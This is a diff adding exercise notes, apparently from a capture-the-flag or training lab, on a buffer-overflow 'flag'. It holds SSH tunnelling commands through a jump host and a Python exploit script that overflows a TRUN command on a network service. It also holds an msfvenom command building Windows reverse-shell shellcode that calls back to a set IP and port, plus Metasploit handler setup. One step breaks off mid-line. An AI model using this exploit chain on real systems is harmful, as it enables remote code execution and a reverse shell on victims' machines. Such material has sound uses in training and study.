@@ -2723,15 +2723,52 @@ s.close()
 
 
 
+## BUFFER OVERFLOW (FLAG) 
+ssh -S /tmp/jump jump -O forward -L 8888:192.168.28.105:2222
+ssh -MS /tmp/T2 comrade@127.0.0.1 -p 8888
+ssh -S /tmp/T2 jump -O forward -L 45678:192.168.150.245:9999
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("127.0.0.1", 45678))
 
 
+1. Using the same shellcode for SECURESEVER Exploit changing your s.connect(("192.168.150.245", 9999)) to
+s.connect(("", 
+```
+#!/usr/bin/env python
+import socket
+buf = "TRUN /.:/"
+buf += "A" * 2003
+buf += "\xa0\x12\x50\x62"
+buf += "\x90" * 15
+
+#0x625012ba --> 62 50 12 ba --> "\xba\x12\x50\x62"
+#0x625012c7 --> 62 50 12 c7 --> "\xc7\x12\x50\x62"
+
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.150.245", 9999))
+
+print s.recv(1024)
+s.send(buf)
+print s.recv(1024)
+
+s.close()
+```
+
+2. Change SHELLCODE to HIT your PUBLIC LINOPS IP on RHP
+```
+msfvenom -p windows/shell/reverse_tcp lhost=10.50.37.42 lport=34567 -b "\x00" -f python
+```
+COPY THIS INTO YOUR SHELLCODE and WRITE
 
 
-
-
-
-
-
+3. FROM METERPRETER CHANGE it to match local host on RHP you decided from SHELLCODE
+```
+msf6 exploit(multi/handler) > set LPORT 34567
+LPORT => 34567
+msf6 exploit(multi/handler) > set LHOST 0.0.0.0
+LHOST => 0.0.0.0
+msf6 exploit(multi/handler) > exploit
+```
 
 
 
